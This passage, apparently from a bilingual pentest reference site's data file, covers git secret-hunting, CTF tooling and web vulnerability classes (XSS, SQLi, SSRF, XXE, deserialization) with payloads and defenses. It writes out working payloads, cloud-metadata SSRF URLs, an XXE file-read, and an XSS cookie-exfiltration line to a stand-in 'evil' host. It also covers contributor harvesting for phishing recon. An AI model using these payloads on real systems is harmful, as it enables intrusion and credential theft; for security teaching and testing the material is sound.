  <li><strong>Secret-Hunting in der History.</strong> <code>trufflehog filesystem --since-commit HEAD~1000 .</code>, <code>gitleaks detect</code>. Secrets, die aus HEAD entfernt wurden, bleiben oft in der History; auch alte Branches und Tags prüfen.</li>
  <li><strong>Autor-Archäologie.</strong> <code>git log --pretty=format:'%an %ae' | sort -u</code> für die Contributor-Liste — füttert OSINT für Phishing-Recon. Commit-Timestamps verraten Arbeitszeiten.</li>
  <li><strong>Fork-Vergleich für Vuln-Triage.</strong> Wenn Upstream eine CVE patcht, sagt <code>git log upstream/main..fork/main</code>, welche Downstream-Forks den Fix nicht gezogen haben.</li>
  <li><strong>Reflog und Unreachable Commits.</strong> <code>git fsck --lost-found</code> stellt committed-und-orphaned-Secrets wieder her, von denen der Autor dachte, sie wären gelöscht.</li>
  <li><strong>GitHub-spezifisch.</strong> <code>github-search</code>-Tooling für org-weite Suche; gelöschte Fork-Commits bleiben via API ~90 Tage sichtbar.</li>
</ul>

<h2>CTF-Tools fürs Muskelgedächtnis</h2>
<ul>
  <li><strong>Web.</strong> Burp Suite (mit Extender-Keymaps), ffuf, sqlmap, gobuster.</li>
  <li><strong>Binary.</strong> Ghidra, gdb + GEF, pwntools, ROPgadget, one_gadget.</li>
  <li><strong>Crypto.</strong> sage, cryptohack-Solver, RsaCtfTool.</li>
  <li><strong>Forensik.</strong> volatility3, autopsy, binwalk, exiftool, foremost.</li>
  <li><strong>Steg.</strong> stegsolve, zsteg, stegseek, Audacity für Audio.</li>
  <li><strong>Network/Reverse.</strong> Wireshark mit Custom-Dissectors, scapy zum Crafting.</li>
</ul>

<h2>Eine private Attack/Defense-Range bauen</h2>
<ul>
  <li><strong>VPN-Topologie.</strong> WireGuard-Hub, ein /24 pro Team. Egress nur zum Scoring-Loop.</li>
  <li><strong>Verwundbare Services.</strong> Das geseedete Vuln-Set alle 15 Minuten aus einer kuratierten Bank historischer CVEs rotieren — verhindert, dass Teilnehmer auf gestrigen Exploits ausruhen.</li>
  <li><strong>Scoring-Loop.</strong> Out-of-Band-Agent pro Service, der SLA-Checks (Verfügbarkeit, Korrektheit) und Flag-Rotation ausführt. Agent läuft in einem Netz, das die Teams nicht erreichen.</li>
  <li><strong>Replay-Capture.</strong> tcpdump im Scoring-Netz für After-Action-Review. Das meiste Lernen passiert im Replay, nicht im Live-Spiel.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>CTFs schärfen spezifische Muskeln. Sie ersetzen keine echten Engagements. Ein Senior-Tester macht beides: regelmäßige CTF-Praxis für Technik-Schärfe und echte Kundenarbeit für Urteilskraft kalibriert auf Produktionsumgebungen.</div>
`
    ),
    phases: ["recon", "methodology"]
  },

  // ─────────────────────────────────────────────────────────────
  // 02 — APPLICATION & IDENTITY SECURITY
  // ─────────────────────────────────────────────────────────────
  {
    id: "common-web-vulnerabilities",
    domain: "application-identity", tier: 1,
    title: T("Common Web Vulnerabilities", "Gängige Web-Schwachstellen"),
    blurb: T(
      "The canonical vulnerability catalog: every class with at least one concrete proof-pattern. The single most-cited entry in the index.",
      "Der kanonische Schwachstellenkatalog: jede Klasse mit mindestens einem konkreten Proof-Muster. Der meistreferenzierte Eintrag im Index."
    ),
    body: B(
      `
<h2>Minimum proof-pattern per class</h2>
<ul>
  <li><strong>Reflected XSS.</strong> <code>?q=&lt;svg/onload=alert(1)&gt;</code> reflected unencoded in HTML context. Confirms HTML injection without breaking the page.</li>
  <li><strong>Stored XSS.</strong> Same payload submitted via form, retrieved on second page-load by a different user. Source ≠ sink is the proof.</li>
  <li><strong>SQL injection.</strong> <code>id=1' AND SLEEP(5)--</code> with 5-second response delay. Time-based confirms without leaking data.</li>
  <li><strong>NoSQL injection.</strong> JSON body with <code>{"user":"admin","pass":{"$ne":""}}</code> → authenticated as admin. Mongo's most common foot-gun.</li>
  <li><strong>Command injection.</strong> <code>?host=127.0.0.1;sleep%205</code> on a ping endpoint, response delayed 5s. Always start with time-based, never with data exfil.</li>
  <li><strong>SSRF.</strong> <code>?url=http://169.254.169.254/latest/meta-data/</code> returns instance metadata. Cloud-specific proof, less ambiguous than internal-network reach.</li>
  <li><strong>Untrusted deserialization (Java).</strong> ysoserial CommonsCollections5 payload → DNS callback to attacker domain. Proves code execution without writing files.</li>
  <li><strong>XXE.</strong> <code>&lt;!ENTITY xxe SYSTEM "http://attacker/p"&gt;</code> in XML body → HTTP callback received. Out-of-band variant proves the parser fetched.</li>
  <li><strong>File upload to RCE.</strong> Upload <code>shell.jsp.png</code>, request <code>/uploads/shell.jsp.png</code> → executes as JSP because of double-extension or MIME mishandling.</li>
  <li><strong>IDOR.</strong> User A creates resource <code>/api/orders/1234</code>, User B requests same URL → 200 OK with A's data. Two test accounts are mandatory for the proof.</li>
  <li><strong>CSRF.</strong> Action endpoint accepts POST without anti-CSRF token. Submit form from attacker-origin HTML, action executes.</li>
  <li><strong>Open redirect.</strong> <code>?next=//evil.com</code> issues a 302 to attacker host. Useful as a chain element, weak finding standalone.</li>
  <li><strong>Subdomain takeover.</strong> DNS CNAME points to a SaaS host that doesn't claim the record. Register the resource on the SaaS → serve attacker content under target domain.</li>
</ul>

<h2>Triage protocol when scope is huge and intel is zero</h2>
<ol>
  <li>Run the catalog top-to-bottom against any reachable surface. One probe per class, minute-long timeouts, log everything.</li>
  <li>Anything that comes back with a non-baseline response → flag for manual follow-up. Don't deep-dive in the first pass.</li>
  <li>After full sweep, sort flags by exploitability × impact. Take the top three; ignore the rest until those are exhausted.</li>
  <li>For each, build the full chain (proof → impact → remediation). Move on only when written up.</li>
</ol>
<div class="rs-rule"><strong>Rule of thumb</strong>A proof-pattern that doesn't break the page is worth more than one that does. Time-based and out-of-band proofs survive WAFs, satisfy the client's reproducer, and don't trigger user-visible errors during testing.</div>
`,
      `
<h2>Minimum-Proof-Pattern pro Klasse</h2>
<ul>
  <li><strong>Reflected XSS.</strong> <code>?q=&lt;svg/onload=alert(1)&gt;</code> unencoded im HTML-Kontext reflektiert. Bestätigt HTML-Injection ohne die Seite zu zerbrechen.</li>
  <li><strong>Stored XSS.</strong> Gleicher Payload via Form submitted, beim zweiten Page-Load von anderem User abgerufen. Source ≠ Sink ist der Beweis.</li>
  <li><strong>SQL Injection.</strong> <code>id=1' AND SLEEP(5)--</code> mit 5-Sekunden-Response-Delay. Time-Based bestätigt ohne Datenleak.</li>
  <li><strong>NoSQL Injection.</strong> JSON-Body <code>{"user":"admin","pass":{"$ne":""}}</code> → als admin authentifiziert. Mongos häufigste Fußfalle.</li>
  <li><strong>Command Injection.</strong> <code>?host=127.0.0.1;sleep%205</code> auf einem Ping-Endpoint, Response 5s verzögert. Immer mit Time-Based starten, nie mit Data-Exfil.</li>
  <li><strong>SSRF.</strong> <code>?url=http://169.254.169.254/latest/meta-data/</code> gibt Instance-Metadata zurück. Cloud-spezifischer Beweis, weniger ambig als Internal-Network-Reach.</li>
  <li><strong>Untrusted Deserialisierung (Java).</strong> ysoserial CommonsCollections5 Payload → DNS-Callback auf Angreifer-Domain. Beweist Code-Execution ohne Files zu schreiben.</li>
  <li><strong>XXE.</strong> <code>&lt;!ENTITY xxe SYSTEM "http://attacker/p"&gt;</code> im XML-Body → HTTP-Callback empfangen. Out-of-Band-Variante beweist, dass der Parser fetcht.</li>
  <li><strong>File-Upload zu RCE.</strong> Upload <code>shell.jsp.png</code>, Request <code>/uploads/shell.jsp.png</code> → executes als JSP wegen Double-Extension oder MIME-Mishandling.</li>
  <li><strong>IDOR.</strong> User A erstellt Ressource <code>/api/orders/1234</code>, User B requested gleiche URL → 200 OK mit A's Daten. Zwei Test-Accounts sind für den Beweis Pflicht.</li>
  <li><strong>CSRF.</strong> Action-Endpoint akzeptiert POST ohne Anti-CSRF-Token. Form aus Angreifer-Origin-HTML submitten, Action executes.</li>
  <li><strong>Open Redirect.</strong> <code>?next=//evil.com</code> liefert 302 auf Angreifer-Host. Nützlich als Kettenelement, allein schwacher Befund.</li>
  <li><strong>Subdomain-Takeover.</strong> DNS-CNAME zeigt auf SaaS-Host, der den Record nicht beansprucht. Ressource auf der SaaS registrieren → Angreifer-Content unter Ziel-Domain ausliefern.</li>
</ul>

<h2>Triage-Protokoll bei riesigem Scope und null Intel</h2>
<ol>
  <li>Katalog top-to-bottom gegen jede erreichbare Oberfläche. Eine Probe pro Klasse, Minuten-Timeouts, alles loggen.</li>
  <li>Alles, was eine Non-Baseline-Response liefert → für manuelles Follow-up flaggen. Im ersten Pass nicht tieftauchen.</li>
  <li>Nach Full-Sweep Flags nach Ausnutzbarkeit × Impact sortieren. Top drei nehmen; Rest ignorieren bis die durch sind.</li>
  <li>Pro Top-Flag die volle Kette bauen (Proof → Impact → Remediation). Erst weiter wenn niedergeschrieben.</li>
</ol>
<div class="rs-rule"><strong>Faustregel</strong>Ein Proof-Pattern, das die Seite nicht zerbricht, ist mehr wert als eines, das es tut. Time-Based- und Out-of-Band-Proofs überstehen WAFs, befriedigen den Reproducer des Kunden und triggern während des Testens keine user-sichtbaren Errors.</div>
`
    ),
    phases: ["xss", "sqli", "csrf", "cmd-injection", "ssrf", "deserialization", "upload", "idor", "xxe"]
  },
  {
    id: "web-attack-defense-canon",
    domain: "application-identity", tier: 1,
    title: T("Web Attack & Defense — Canonical Reference", "Web — Angriff & Verteidigung kanonisch"),
    blurb: T(
      "Each vulnerability class presented as an attack/defense pair, with the briefing-level overview and the protocol/header/encoding points where weaknesses recur.",
      "Jede Schwachstellenklasse als Angriffs-/Verteidigungs-Paar, mit Briefing-Übersicht und den Protokoll-/Header-/Encoding-Punkten, an denen Schwächen wiederkehren."
    ),
    body: B(
      `
<h2>Class-by-class — attack / defense / detection signal</h2>
<h3>XSS</h3>
<ul>
  <li><strong>Attack.</strong> Inject HTML or JS into a sink (innerHTML, document.write, attribute, JS string).</li>
  <li><strong>Defense.</strong> Context-aware output encoding, strict CSP (<code>script-src 'self'</code>, no <code>unsafe-inline</code>), Trusted Types in modern browsers.</li>
  <li><strong>Detection.</strong> CSP <code>report-uri</code> violations spiking, WAF rule <code>OWASP CRS 941xxx</code> firing, requests with <code>&lt;script</code> or <code>onerror=</code> in parameters.</li>
</ul>
<h3>SQL injection</h3>
<ul>
  <li><strong>Attack.</strong> Unescaped concatenation into SQL string.</li>
  <li><strong>Defense.</strong> Parameterized queries. ORMs help only if you avoid their raw-query escape hatches.</li>
  <li><strong>Detection.</strong> DB-tier errors involving <code>syntax error near</code>; WAF rules <code>942xxx</code>; queries with <code>UNION SELECT</code>, <code>SLEEP(</code>, or <code>'; --</code>.</li>
</ul>
<h3>SSRF</h3>
<ul>
  <li><strong>Attack.</strong> Server fetches attacker-supplied URL → internal services, cloud metadata.</li>
  <li><strong>Defense.</strong> Allow-list of destination hosts at the egress layer. Deny RFC1918, 169.254/16, ::ffff:0:0/96, link-local. Resolve once, validate, then connect — defeats DNS rebinding.</li>
  <li><strong>Detection.</strong> Outbound HTTP from app tier to <code>169.254.169.254</code>, <code>localhost</code>, RFC1918. DNS queries for attacker domains.</li>
</ul>
<h3>CSRF</h3>
<ul>
  <li><strong>Attack.</strong> State-changing request triggered cross-origin.</li>
  <li><strong>Defense.</strong> SameSite=Lax cookies (default in modern browsers), anti-CSRF token bound to session, custom-header requirement for JSON APIs (forces preflight).</li>
  <li><strong>Detection.</strong> Sensitive POSTs with <code>Origin</code>/<code>Referer</code> from unexpected hosts.</li>
</ul>
<h3>Deserialization</h3>
<ul>
  <li><strong>Attack.</strong> Untrusted serialized object reaches a deserializer with available gadgets.</li>
  <li><strong>Defense.</strong> Don't deserialize untrusted input. If you must, use a format-only serializer (JSON without typed binding) and validate before unmarshaling.</li>
  <li><strong>Detection.</strong> JVM/CLR exceptions involving InvocationTargetException; child process spawned from app-server JVM.</li>
</ul>
<h3>File upload to RCE</h3>
<ul>
  <li><strong>Attack.</strong> Upload with executable extension, request URL, server executes.</li>
  <li><strong>Defense.</strong> Store uploads on a domain that doesn't execute server-side; serve with <code>Content-Disposition: attachment</code>; never trust client-provided MIME or extension.</li>
  <li><strong>Detection.</strong> First-time-seen file extensions written to upload dirs; web-server access logs hitting <code>.php</code> / <code>.jsp</code> / <code>.aspx</code> in user-upload paths.</li>
</ul>

<h2>Protocol / header / encoding hotspots</h2>
<ul>
  <li><strong>Set-Cookie attributes.</strong> Missing <code>Secure</code>, <code>HttpOnly</code>, or wrong <code>SameSite</code> on session cookies. Domain attribute scoping too broadly.</li>
  <li><strong>CSP gaps.</strong> <code>script-src 'self' 'unsafe-inline'</code> is a fig leaf. <code>script-src https:</code> trivially bypassable via attacker-controlled https origin.</li>
  <li><strong>Content-type sniffing.</strong> Browser ignores wrong <code>Content-Type</code> and renders user-uploaded HTML. Defense: <code>X-Content-Type-Options: nosniff</code>.</li>
  <li><strong>Reverse-proxy encoding mismatch.</strong> nginx normalizes <code>..%2f</code> differently than backend. Backend gets a path traversal that proxy normalization hid from the WAF.</li>
  <li><strong>HTTP/2 → HTTP/1.1 conversion.</strong> Pseudo-header smuggling between front-end and back-end. Defense: end-to-end H/2 or strict re-encoding at the gateway.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Defense is a system property, not a feature list. A CSP without <code>upgrade-insecure-requests</code> and a SameSite policy and an Origin check isn't a CSP — it's a placebo. Look for the missing layer when reviewing.</div>
`,
      `
<h2>Klasse für Klasse — Angriff / Verteidigung / Detektionssignal</h2>
<h3>XSS</h3>
<ul>
  <li><strong>Angriff.</strong> HTML oder JS in eine Sink injizieren (innerHTML, document.write, Attribut, JS-String).</li>
  <li><strong>Verteidigung.</strong> Kontext-bewusstes Output-Encoding, strenge CSP (<code>script-src 'self'</code>, kein <code>unsafe-inline</code>), Trusted Types in modernen Browsern.</li>
  <li><strong>Detektion.</strong> CSP-<code>report-uri</code>-Violations steigend, WAF-Regel <code>OWASP CRS 941xxx</code> feuernd, Requests mit <code>&lt;script</code> oder <code>onerror=</code> in Parametern.</li>
</ul>
<h3>SQL Injection</h3>
<ul>
  <li><strong>Angriff.</strong> Unescaped-Konkatenation in SQL-String.</li>
  <li><strong>Verteidigung.</strong> Parameterized Queries. ORMs helfen nur, wenn du ihre Raw-Query-Escape-Hatches meidest.</li>
  <li><strong>Detektion.</strong> DB-Tier-Errors mit <code>syntax error near</code>; WAF-Regeln <code>942xxx</code>; Queries mit <code>UNION SELECT</code>, <code>SLEEP(</code> oder <code>'; --</code>.</li>
</ul>
<h3>SSRF</h3>
<ul>
  <li><strong>Angriff.</strong> Server fetcht angreifer-gelieferte URL → interne Services, Cloud-Metadata.</li>
  <li><strong>Verteidigung.</strong> Allow-List von Destination-Hosts am Egress-Layer. RFC1918, 169.254/16, ::ffff:0:0/96, Link-Local denyen. Einmal auflösen, validieren, dann connecten — schlägt DNS-Rebinding.</li>
  <li><strong>Detektion.</strong> Outbound HTTP vom App-Tier zu <code>169.254.169.254</code>, <code>localhost</code>, RFC1918. DNS-Queries auf Angreifer-Domains.</li>
</ul>
<h3>CSRF</h3>
<ul>
  <li><strong>Angriff.</strong> State-ändernder Request cross-origin getriggert.</li>
  <li><strong>Verteidigung.</strong> SameSite=Lax-Cookies (default in modernen Browsern), Anti-CSRF-Token an Session gebunden, Custom-Header-Requirement für JSON-APIs (erzwingt Preflight).</li>
  <li><strong>Detektion.</strong> Sensitive POSTs mit <code>Origin</code>/<code>Referer</code> von unerwarteten Hosts.</li>
</ul>
<h3>Deserialisierung</h3>
<ul>
  <li><strong>Angriff.</strong> Untrusted serialisiertes Objekt erreicht einen Deserialisierer mit verfügbaren Gadgets.</li>
  <li><strong>Verteidigung.</strong> Untrusted-Input nicht deserialisieren. Wenn nötig, format-only Serializer (JSON ohne typed Binding) und vor Unmarshaling validieren.</li>
  <li><strong>Detektion.</strong> JVM-/CLR-Exceptions mit InvocationTargetException; Child-Process gestartet aus App-Server-JVM.</li>
</ul>
<h3>File-Upload zu RCE</h3>
<ul>
  <li><strong>Angriff.</strong> Upload mit executable Extension, URL requesten, Server executes.</li>
  <li><strong>Verteidigung.</strong> Uploads auf einer Domain speichern, die nicht serverseitig ausführt; mit <code>Content-Disposition: attachment</code> ausliefern; niemals client-gelieferter MIME oder Extension trauen.</li>
  <li><strong>Detektion.</strong> Erstmalig gesehene File-Extensions in Upload-Dirs; Web-Server-Access-Logs hitten <code>.php</code> / <code>.jsp</code> / <code>.aspx</code> in User-Upload-Pfaden.</li>
</ul>

<h2>Protokoll- / Header- / Encoding-Hotspots</h2>
<ul>
  <li><strong>Set-Cookie-Attribute.</strong> Fehlendes <code>Secure</code>, <code>HttpOnly</code> oder falsches <code>SameSite</code> auf Session-Cookies. Domain-Attribut zu breit gescoped.</li>
  <li><strong>CSP-Lücken.</strong> <code>script-src 'self' 'unsafe-inline'</code> ist ein Feigenblatt. <code>script-src https:</code> trivial umgehbar via angreifer-kontrollierte HTTPS-Origin.</li>
  <li><strong>Content-Type-Sniffing.</strong> Browser ignoriert falschen <code>Content-Type</code> und rendert user-uploaded HTML. Verteidigung: <code>X-Content-Type-Options: nosniff</code>.</li>
  <li><strong>Reverse-Proxy-Encoding-Mismatch.</strong> nginx normalisiert <code>..%2f</code> anders als Backend. Backend bekommt einen Path-Traversal, den Proxy-Normalisierung vor der WAF versteckt hat.</li>
  <li><strong>HTTP/2 → HTTP/1.1-Konvertierung.</strong> Pseudo-Header-Smuggling zwischen Front- und Back-End. Verteidigung: End-to-End H/2 oder strikte Re-Codierung am Gateway.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Verteidigung ist eine System-Eigenschaft, keine Feature-Liste. Eine CSP ohne <code>upgrade-insecure-requests</code> und SameSite-Policy und Origin-Check ist keine CSP — sie ist ein Placebo. Beim Review die fehlende Schicht suchen.</div>
`
    ),
    phases: ["xss", "sqli", "csrf", "ssrf", "cmd-injection", "upload", "idor"]
  },
  {
    id: "xss-comprehensive",
    domain: "application-identity", tier: 1,
    title: T("XSS — Comprehensive Reference", "XSS — umfassende Referenz"),
    blurb: T(
      "The full XSS landscape: reflected, stored, DOM, mutation. Sink-versus-source structuring, CSP/WAF bypass, hook-and-control patterns, and the conditions under which payloads become worm-like.",
      "Die vollständige XSS-Landschaft: reflected, stored, DOM, mutation. Sink-vs-Source-Strukturierung, CSP-/WAF-Bypass, Hook-and-Control-Muster und die Bedingungen unter denen Payloads wurmartig werden."
    ),
    body: B(
      `
<h2>Classes</h2>
<ul>
  <li><strong>Reflected.</strong> Payload in request, reflected in same response. Usually URL parameter or form POST.</li>
  <li><strong>Stored.</strong> Payload submitted once, served to many. Comments, profile fields, admin notes, log viewers.</li>
  <li><strong>DOM-based.</strong> Payload never reaches server; client-side JS reads from <code>location.hash</code>, <code>postMessage</code>, or <code>document.referrer</code> and writes to a dangerous sink.</li>
  <li><strong>Mutation (mXSS).</strong> Innocuous markup mutates into malicious markup when re-parsed (e.g., <code>&lt;img src=x&gt;</code> set via innerHTML, then serialized and re-parsed → namespace confusion).</li>
</ul>

<h2>Sink-side review checklist</h2>
<ul>
  <li><strong>innerHTML / outerHTML / insertAdjacentHTML.</strong> Grep target. Anywhere user input flows here is suspicious by default.</li>
  <li><strong>document.write / document.writeln.</strong> Modern code shouldn't use these. Where you find them, suspect XSS.</li>
  <li><strong>jQuery <code>.html()</code>, <code>.append()</code>, <code>.prepend()</code>.</strong> Same as innerHTML semantically.</li>
  <li><strong>React <code>dangerouslySetInnerHTML</code>.</strong> Self-naming sink. Always escalate.</li>
  <li><strong>Vue <code>v-html</code> / Svelte <code>{@html}</code> / Angular <code>[innerHTML]</code>.</strong> Same shape, same risk.</li>
  <li><strong>Attribute sinks.</strong> <code>setAttribute('href', x)</code> with <code>javascript:</code> URL; <code>setAttribute('on*', ...)</code> binding event handlers.</li>
  <li><strong>eval, Function, setTimeout/setInterval(string).</strong> Anywhere strings are executed.</li>
  <li><strong>Template-string in render path.</strong> Server-side template injection often comes in here.</li>
</ul>

<h2>CSP bypass patterns</h2>
<ul>
  <li><strong>JSONP endpoints in allowed origin.</strong> <code>script-src 'self'</code> + a self-hosted JSONP endpoint = trivially callable as <code>&lt;script src=/jsonp?callback=alert(1)//&gt;</code>.</li>
  <li><strong>Angular template injection.</strong> CSP allows the framework's bundle; attacker injects Angular template syntax that the framework evaluates.</li>
  <li><strong>Dangling markup.</strong> Unclosed attribute steals subsequent HTML up to next quote — exfiltrates secrets even when scripts are blocked.</li>
  <li><strong>Base tag injection.</strong> Inject <code>&lt;base href=//attacker&gt;</code> → relative-URL scripts resolve to attacker origin.</li>
  <li><strong>Strict-dynamic with nonce reflection.</strong> Reflected nonce in the response = attacker-controlled nonced script tag.</li>
</ul>

<h2>Payload encoding quick reference</h2>
<ul>
  <li><strong>HTML context.</strong> <code>&lt;svg/onload=alert(1)&gt;</code> compact, no quotes needed.</li>
  <li><strong>HTML attribute (single-quoted).</strong> <code>' onmouseover='alert(1)</code>.</li>
  <li><strong>HTML attribute (unquoted).</strong> <code>x onfocus=alert(1) autofocus</code>.</li>
  <li><strong>JavaScript string context.</strong> <code>'-alert(1)-'</code> breaks out of single-quoted string.</li>
  <li><strong>JSON in script context.</strong> <code>&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</code> breaks out of the script block.</li>
  <li><strong>Strict CSP, no scripts.</strong> <code>&lt;img src=x onerror=fetch('//evil/?'+document.cookie)&gt;</code> blocked. <code>&lt;iframe src='data:text/html,&lt;script&gt;...</code> often blocked. Look for dangling markup.</li>
</ul>

<h2>Post-XSS use cases</h2>
<ul>
  <li><strong>Account takeover.</strong> Read session token from <code>document.cookie</code> (if no HttpOnly) or trigger a session-bound action via fetch.</li>
  <li><strong>Internal recon.</strong> XSS as SSRF — make fetch() calls to internal URLs from the victim's authenticated session.</li>
  <li><strong>Persistent foothold.</strong> Stored XSS in admin-facing surface → triggers when admin opens the report → admin-level privileged action under attacker control.</li>
  <li><strong>Browser-as-pivot.</strong> XSS into a corporate intranet app from external referrer → fetch internal-only resources via the browser's authenticated session.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Always prove the XSS in two places: once with a non-destructive payload (<code>alert(document.domain)</code> in screenshot) and once with a recipe the developer can execute against their own staging. Two proofs = no disputes about whether it was real.</div>
`,
      `
<h2>Klassen</h2>
<ul>
  <li><strong>Reflected.</strong> Payload im Request, in selber Response reflektiert. Meist URL-Parameter oder Form-POST.</li>
  <li><strong>Stored.</strong> Einmal submitted, an viele ausgeliefert. Kommentare, Profilfelder, Admin-Notes, Log-Viewer.</li>
  <li><strong>DOM-Based.</strong> Payload erreicht Server nie; Client-JS liest aus <code>location.hash</code>, <code>postMessage</code> oder <code>document.referrer</code> und schreibt in gefährliche Sink.</li>
  <li><strong>Mutation (mXSS).</strong> Harmloses Markup mutiert zu malicious Markup beim Re-Parse (z.B. <code>&lt;img src=x&gt;</code> via innerHTML gesetzt, dann serialisiert und re-parsed → Namespace-Confusion).</li>
</ul>

<h2>Sink-seitige Review-Checkliste</h2>
<ul>
  <li><strong>innerHTML / outerHTML / insertAdjacentHTML.</strong> Grep-Target. Wo User-Input dort fließt, default verdächtig.</li>
  <li><strong>document.write / document.writeln.</strong> Moderner Code sollte das nicht nutzen. Wo gefunden, XSS verdächtigen.</li>
  <li><strong>jQuery <code>.html()</code>, <code>.append()</code>, <code>.prepend()</code>.</strong> Semantisch wie innerHTML.</li>
  <li><strong>React <code>dangerouslySetInnerHTML</code>.</strong> Selbstbenennende Sink. Immer eskalieren.</li>
  <li><strong>Vue <code>v-html</code> / Svelte <code>{@html}</code> / Angular <code>[innerHTML]</code>.</strong> Gleiche Form, gleiches Risiko.</li>
  <li><strong>Attribute-Sinks.</strong> <code>setAttribute('href', x)</code> mit <code>javascript:</code>-URL; <code>setAttribute('on*', ...)</code> Event-Handler-Binding.</li>
  <li><strong>eval, Function, setTimeout/setInterval(string).</strong> Überall wo Strings ausgeführt werden.</li>
  <li><strong>Template-String im Render-Pfad.</strong> Server-Side Template Injection landet oft hier.</li>
</ul>

<h2>CSP-Bypass-Muster</h2>
<ul>
  <li><strong>JSONP-Endpoint in erlaubter Origin.</strong> <code>script-src 'self'</code> + self-hosted JSONP-Endpoint = trivial aufrufbar als <code>&lt;script src=/jsonp?callback=alert(1)//&gt;</code>.</li>
  <li><strong>Angular-Template-Injection.</strong> CSP erlaubt das Framework-Bundle; Angreifer injiziert Angular-Template-Syntax, die das Framework auswertet.</li>
  <li><strong>Dangling Markup.</strong> Ungeschlossenes Attribut stiehlt folgendes HTML bis zum nächsten Quote — exfiltriert Secrets selbst wenn Skripte blockiert sind.</li>
  <li><strong>Base-Tag-Injection.</strong> <code>&lt;base href=//attacker&gt;</code> injizieren → Relative-URL-Skripte lösen auf Angreifer-Origin auf.</li>
  <li><strong>Strict-Dynamic mit Nonce-Reflektion.</strong> Reflektierte Nonce in der Response = angreifer-kontrolliertes nonced Script-Tag.</li>
</ul>

<h2>Payload-Encoding-Schnellreferenz</h2>
<ul>
  <li><strong>HTML-Kontext.</strong> <code>&lt;svg/onload=alert(1)&gt;</code> kompakt, keine Quotes nötig.</li>
  <li><strong>HTML-Attribut (single-quoted).</strong> <code>' onmouseover='alert(1)</code>.</li>
  <li><strong>HTML-Attribut (unquoted).</strong> <code>x onfocus=alert(1) autofocus</code>.</li>
  <li><strong>JavaScript-String-Kontext.</strong> <code>'-alert(1)-'</code> bricht aus Single-Quoted-String aus.</li>
  <li><strong>JSON in Script-Kontext.</strong> <code>&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</code> bricht aus dem Script-Block aus.</li>
  <li><strong>Strict CSP, keine Skripte.</strong> <code>&lt;img src=x onerror=fetch('//evil/?'+document.cookie)&gt;</code> blockiert. <code>&lt;iframe src='data:text/html,&lt;script&gt;...</code> oft blockiert. Dangling-Markup suchen.</li>
</ul>

<h2>Post-XSS Use Cases</h2>
<ul>
  <li><strong>Account-Takeover.</strong> Session-Token aus <code>document.cookie</code> lesen (falls kein HttpOnly) oder Session-gebundene Action via fetch triggern.</li>
  <li><strong>Interne Recon.</strong> XSS als SSRF — fetch()-Calls auf interne URLs aus der authentifizierten Victim-Session.</li>
  <li><strong>Persistenter Foothold.</strong> Stored XSS in Admin-facing-Surface → triggert wenn Admin den Report öffnet → Admin-level privilegierte Action unter Angreifer-Kontrolle.</li>
  <li><strong>Browser-als-Pivot.</strong> XSS in Corporate-Intranet-App aus externem Referrer → interne Resourcen via authentifizierter Browser-Session fetchen.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>XSS immer an zwei Stellen beweisen: einmal mit nicht-destruktivem Payload (<code>alert(document.domain)</code> im Screenshot) und einmal mit Rezept, das der Entwickler gegen seine eigene Staging ausführen kann. Zwei Beweise = keine Diskussion ob real.</div>
`
    ),
    phases: ["xss", "dom-xss"]
  },
  {
    id: "injection-and-traversal",
    domain: "application-identity", tier: 1,
    title: T("Injection, SSRF & XXE", "Injection, SSRF & XXE"),
    blurb: T(
      "Server-side request forgery, XML external entity weaponization, and path-traversal cousins — vector enumeration, blind-channel exfiltration, parser-quirk routing.",
      "Server-side Request Forgery, XXE-Waffenbau und die Path-Traversal-Verwandten — Vektor-Enumeration, Blind-Channel-Exfiltration und Parser-Quirk-Routing."
    ),
    body: B(
      `
<h2>SSRF — vector inventory</h2>
<ul>
  <li><strong>URL parameter.</strong> <code>?url=</code>, <code>?next=</code>, <code>?image=</code>, <code>?callback=</code>, <code>?webhook=</code>. Anything where the server fetches.</li>
  <li><strong>Webhook callback.</strong> "We POST to your URL on event X" — attacker sets URL to internal target. Bypasses outbound allow-lists in many setups.</li>
  <li><strong>Image / avatar fetch.</strong> <code>?avatar=http://...</code> with server-side image-processing pipeline. Returns may be opaque, so test blind first.</li>
  <li><strong>PDF / HTML-to-PDF renderers.</strong> Inject <code>&lt;iframe src=//attacker&gt;</code> or <code>&lt;img src=//attacker&gt;</code> into HTML that the server renders. Most renderers fetch sub-resources without sandboxing.</li>
  <li><strong>XML / SOAP body with URLs.</strong> Many SOAP services follow URLs in WSDL/SOAP envelopes server-side.</li>
  <li><strong>Document import.</strong> "Import from URL" features — DOC, XLSX, ZIP — fetch the URL server-side, sometimes follow redirects to internal.</li>
</ul>

<h2>SSRF — proof and exfil techniques</h2>
<ul>
  <li><strong>Cloud metadata first.</strong> <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> (AWS), <code>http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json</code> with <code>Metadata-Flavor: Google</code>, <code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code> with <code>Metadata: true</code> (Azure).</li>
  <li><strong>Blind via DNS.</strong> <code>?url=http://&lt;random&gt;.attacker.tld/</code> + listen on your authoritative DNS for queries.</li>
  <li><strong>Blind via HTTP.</strong> Use an interactsh / Burp Collaborator URL. Detects fetch without needing visible response.</li>
  <li><strong>Internal port scan.</strong> Time-difference on response: connection-refused vs accepted vs timed-out gives port status.</li>
  <li><strong>Redirect chaining.</strong> Server validates URL against allow-list, follows redirect: hosted attacker URL returns 302 to <code>http://169.254.169.254</code>. Trivial bypass.</li>
  <li><strong>DNS rebinding.</strong> Attacker DNS returns valid IP on first lookup (passes allow-list), internal IP on second lookup (resolved at fetch). Defeats parse-time validation.</li>
  <li><strong>Protocol smuggling.</strong> If parser accepts <code>gopher://</code> or <code>dict://</code> or <code>file://</code> — Redis on localhost via gopher is the classic chain.</li>
</ul>

<h2>XXE</h2>
<ul>
  <li><strong>In-band exfil.</strong> <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code> — if response echoes the parsed body, file contents are returned.</li>
